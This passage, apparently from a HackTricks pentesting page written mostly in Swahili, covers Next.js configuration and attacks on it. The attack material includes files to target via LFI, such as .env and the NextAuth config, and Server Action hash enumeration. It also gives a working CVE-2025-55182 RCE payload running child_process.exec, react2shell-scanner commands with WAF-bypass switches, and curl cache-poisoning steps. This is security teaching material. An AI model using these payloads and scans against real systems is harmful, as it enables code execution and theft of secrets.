**Mfano wa Mpangilio Mbaya:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Tatizo:**

- **Kufichua Njia Zenye Taarifa Nyeti:** Kufanya alias kwa direktorii nyeti na kuruhusu upatikanaji upande wa client kunaweza leak taarifa za siri.
- **Kujumuisha Siri (Bundling Secrets):** Ikiwa faili nyeti zinajumuishwa kama bundle kwa client, maudhui yake yanapatikana kupitia source maps au kwa kuchunguza client-side code.

**Jinsi watapeli wanavyovitumia:**

Watapeli wanaweza kupata au kujenga upya muundo wa direktori wa application, na hivyo kupata au kutumika faili au data nyeti.

</details>

### `pages/_app.js` na `pages/_document.js`

#### **`pages/_app.js`**

**Madhumuni:** Inabadilisha App component ya default, ikiruhusu state ya global, styles, na components za layout.

**Matumizi:**

- Kuingiza global CSS.
- Kuongeza layout wrappers.
- Kuunganisha libraries za state management.

**Mfano:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Madhumuni:** Inapindua Document chaguomsingi, ikiruhusu kubinafsisha tag za `<html>` na `<body>`.

**Matumizi:**

- Kurekebisha tag za `<html>` au `<body>`.
- Kuongeza meta tags au scripts maalum.
- Kuunganisha fonts za third-party.

**Mfano:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Seva Maalum (Hiari)

**Madhumuni:** Ingawa Next.js inakuja na seva iliyojengwa ndani, unaweza kuunda seva maalum kwa matumizi ya hali ya juu kama routing maalum au kuunganishwa na huduma za backend zilizopo.

**Kumbuka:** Kutumia seva maalum kunaweza kuzuia chaguzi za deployment, hasa kwenye majukwaa kama Vercel ambayo yameboreshwa kwa seva iliyojengwa ndani ya Next.js.

**Mfano:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Mambo ya Ziada ya Miundo na Usalama

### Variable za Mazingira na Usanidi

**Madhumuni:** Kusimamia taarifa nyeti na mipangilio ya usanidi nje ya msimbo.

**Mbinu Bora:**

- **Tumia faili `.env`:** Hifadhi variables kama API keys katika `.env.local` (zitengwa kutoka kwenye version control).
- **Pata variables kwa usalama:** Tumia `process.env.VARIABLE_NAME` kufikia variables za mazingira.
- **Usifunue siri kwenye client:** Hakikisha variables nyeti zinatumiwa upande wa server pekee.

**Mfano:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Kumbuka:** Ili kuzuia variables ziwe kwa server-side tu, usizijumuishe katika `env` object au uzianze na `NEXT_PUBLIC_` ili zionekane kwa client.

### Mafaili muhimu ya server ya kulenga kupitia LFI/download endpoints

Ikiwa unapata path traversal au download API katika app ya Next.js, lenga compiled artifacts zinazoweza leak server-side secrets na auth logic:

- `.env` / `.env.local` kwa session secrets na provider credentials.
- `.next/routes-manifest.json` and `.next/build-manifest.json` kwa orodha kamili ya routes.
- `.next/server/pages/api/auth/[...nextauth].js` kurejesha compiled NextAuth configuration (mara nyingi ina fallback passwords wakati `process.env` values hazijowekwa).
- `next.config.js` / `next.config.mjs` kwa kupitia rewrites, redirects na middleware routing.

### Uthibitishaji na Uidhinishaji

**Mbinu:**

- **Session-Based Authentication:** Tumia cookies kusimamia user sessions.
- **Token-Based Authentication:** Tekeleza JWTs kwa ajili ya stateless authentication.
- **Third-Party Providers:** Unganisha na OAuth providers (mfano, Google, GitHub) kwa kutumia libraries kama `next-auth`.

**Mambo ya Usalama:**

- **Secure Cookies:** Weka sifa `HttpOnly`, `Secure`, na `SameSite`.
- **Password Hashing:** Daima hash passwords kabla ya kuzihifadhi.
- **Input Validation:** Zuia injection attacks kwa kuthibitisha na kusafisha inputs.

**Mfano:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Uboreshaji wa Utendaji

**Mikakati:**

- **Uboreshaji wa Picha:** Tumia kipengele cha Next.js `next/image` kwa uboreshaji wa picha kiotomatiki.
- **Ugawaji wa Msimbo:** Tumia dynamic imports kugawanya msimbo na kupunguza muda wa upakiaji wa awali.
- **Caching:** Tekeleza mikakati ya caching kwa majibu ya API na static assets.
- **Lazy Loading:** Pakia vipengele au assets tu zinapohitajika.

**Mfano:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Next.js ya kisasa inatumia “Server Actions” ambazo zinafanywa kwenye server lakini zinaamuliwa kutoka kwa client. Katika production miito hii haionekani wazi: POSTs zote huenda kwenye endpoint ya pamoja na kutofautishwa na hash maalum ya build inayotumwa kwenye header `Next-Action`. Mfano:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
When `productionBrowserSourceMaps` imewezeshwa, minified JS chunks zina calls za `createServerReference(...)` ambazo leak muundo wa kutosha (pamoja na source maps zinazohusiana) ili kupata mapping kati ya action hash na jina la function asilia. Hii inakuwezesha kutafsiri hashes zinazotambulika katika `Next-Action` kuwa malengo mahususi kama `deleteUserAccount()` au `exportFinancialData()`.

### Njia ya uchimbaji (regex on minified JS + optional source maps)

Tafuta JS chunks zilizopakuliwa kwa `createServerReference` na chukua hash pamoja na function/source symbol. Miundo miwili muhimu:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Kikundi 1: hash ya server action (40+ hex chars)
- Kikundi 2: symbol au path inayoweza kutatuliwa hadi function asili kupitia source map inapopatikana

Ikiwa script inatangaza source map (trailer comment `//# sourceMappingURL=<...>.map`), ipate na tatua symbol/path hadi jina la function asili.

### Mtiririko wa kazi

- Ugunduzi wa pasivu wakati wa kuvinjari: rekodi requests zenye vichwa vya `Next-Action` na JS chunk URLs.
- Pata JS bundles zilizorejelewa na faili za `*.map` zinazofuatana (zinapokuwepo).
- Endesha regex hapo juu ili kujenga kamusi ya hash↔name.
- Tumia kamusi kulenga testing:
- Triage inayotegemea majina (mfano, `transferFunds`, `exportFinancialData`).
- Fuatilia coverage katika builds kwa jina la function (hashes hubadilika kati ya builds).

### Kufanya majaribio ya hidden actions (template-based request)

Chukua POST halali ulioonekana in-proxy kama template na badilisha thamani ya `Next-Action` ili kulenga action nyingine uliyogundua:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Replay in Repeater and test authorization, input validation and business logic of otherwise unreachable actions.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) inaotomatisha yaliyotajwa hapo juu ndani ya Burp:
- Inachimba historia ya proxy kwa JS chunks, inatoa `createServerReference(...)` entries, na huchambua source maps inapopatikana.
- Inahifadhi kamusi inayoweza kutafutwa ya hash↔function-name na inaondoa nakala kati ya builds kwa jina la function.
- Inaweza kupata POST ya template halali na kufungua tab ya Repeater tayari-kutumwa na hash ya action lengwa imebadilishwa ndani.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Inahitaji `productionBrowserSourceMaps` ziwe enabled katika production ili kurejesha majina kutoka bundles/source maps.
- Function-name disclosure si vulnerability kwa nafsi yake; itumie kuongoza ugunduzi na kujaribu authorization ya kila action.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments that expose Server Actions on `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** yana udhaifu mkubwa wa server-side prototype pollution wakati wa deserialization ya **Flight** chunk. Kwa kutengeneza marejeo ya `$` ndani ya payload ya Flight mshambuliaji anaweza kupitisha kutoka kwenye prototypes zilizosababishwa na pollution hadi kwenye utekelezaji wa arbitrary JavaScript na kisha hadi utekelezaji wa amri za OS ndani ya mchakato wa Node.js.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` ili resolver iandike function `then` kwenye `Object.prototype`. Kila plain object itakayosindika baadaye inakuwa thenable, ikimruhusu mshambuliaji kuathiri async control flow ndani ya internals za RSC.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. Wakati wa resolution, `object.constructor` → `Object`, na `Object.constructor` → `Function`, hivyo miito ya baadaye kwa `_formData.get()` kwa kweli hufuata `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. Wakati `_formData.get` iliyochafuliwa itakapoitwa, framework itatekeleza `Function(_prefix)(...)`, hivyo JS iliyowekwa inaweza kuendesha `require('child_process').exec()` au primitive nyingine yoyote ya Node.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Kuweka ramani ya ufunuo wa React Server Functions

React Server Functions (RSF) ni functions zozote zinazojumuisha directive `'use server';`. Kila form action, mutation, au fetch helper iliyofungwa kwa moja ya functions hizo inakuwa RSC Flight endpoint ambayo kwa urahisi ita-deserialize attacker-supplied payloads. Hatua za recon zinazofaa zilizotokana na tathmini za React2Shell:

- **Static inventory:** angalia directive ili kuelewa RSFs ngapi zinatolewa kiotomatiki na framework.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` inaiwezesha App Router + `app/` directory kwa chaguo-msingi, ambayo bila kusikika hubadilisha kila route kuwa endpoint inayoweza RSC. App Router assets kama `/_next/static/chunks/app/` au responses zinazotiririsha Flight chunks kupitia `text/x-component` ni strong Internet-facing fingerprints.
- **Implicitly vulnerable RSC deployments:** Onyo la React linabainisha kwamba apps zinazotuma RSC runtime zinaweza kuweza kutumika **even without explicit RSFs**, hivyo chukulia build yoyote inayotumia `react-server-dom-*` 19.0.0–19.2.0 kama ya kutiliwa shaka.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, n.k. hutumia serializer ile ile na kurithi identical remote attack surface mpaka wajumuishe patched React builds.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **vulnerable** in 19.0.0, 19.1.0–19.1.1 and 19.2.0; **patched** in 19.0.1, 19.1.2 and 19.2.1 respectively.
- **Next.js stable:** App Router releases 15.0.0–16.0.6 zinaingiza the vulnerable RSC stack. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 include fixed deps, hivyo build yoyote chini ya matoleo hayo ni high-value.
- **Next.js canary:** `14.3.0-canary.77+` pia inasafirisha the buggy runtime na kwa sasa haijapata patched canary drops, ikifanya fingerprints hizo kuwa strong exploitation candidates.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) inatuma a crafted multipart Flight request kwa candidate paths na inatazama server-side behavior:

- **Default mode** inatekeleza deterministic RCE payload (math operation reflected via `X-Action-Redirect`) ikithibitisha code execution.
- **`--safe-check` mode** kwa makusudi hupotosha Flight message ili patched servers zirudishe `200/400`, wakati vulnerable targets hutengeneza `HTTP/500` responses zenye substring `E{"digest"` ndani ya body. Jozi ya `(500 + digest)` kwa sasa ni remote oracle inayotegemewa zaidi iliyochapishwa na defenders.
- Built-in `--waf-bypass`, `--vercel-waf-bypass`, and `--windows` switches zinarekebisha payload layout, zinaongeza junk, au zinabadilisha OS commands ili uweze probe real Internet assets.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Masuala mengine ya hivi karibuni ya App Router (mwisho wa 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – malformed Flight payloads zinaweza kumfanya resolver wa RSC kuingia kwenye mzunguko usio na mwisho (pre-auth DoS) au kulazimisha serialization ya compiled Server Function code kwa vitendo vingine. App Router builds ≥13.3 zinaathirika hadi zitakapofungwa; 15.0.x–16.0.x zinahitaji mstari maalum wa patch kutoka kwa advisory ya upstream. Tumia tena njia ya kawaida ya Server Action lakini stream body ya `text/x-component` yenye marejeo mabaya ya `$`. Kando ya CDN, muunganisho uliokaa wazi unawekwa wazi kwa cache timeouts, na kufanya DoS kuwa nafuu.
- **Vidokezo vya Triage:** Malengo ambayo hayajafungwa hurejesha `500` na `E{"digest"` baada ya malformed Flight payloads; builds zilizosuluhishwa hurejesha `400/200`. Jaribu endpoint yoyote inayostream tayari Flight chunks (tafuta headers `Next-Action` au responses `text/x-component`) na replay kwa payload iliyobadilishwa.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – kukosekana kwa `Vary` kiliruhusu response ya `Accept: text/x-component` kuwekwa kwenye cache na kutumiwa na browsers zinazotarajia HTML. Omba moja ya ku-prime inaweza kubadilisha ukurasa na raw RSC payloads. Mtiririko wa PoC:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
Ikiwa response ya pili inarudisha JSON Flight data badala ya HTML, route inaweza kuathiriwa na poisoning. Futa cache baada ya kujaribu.

## References

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
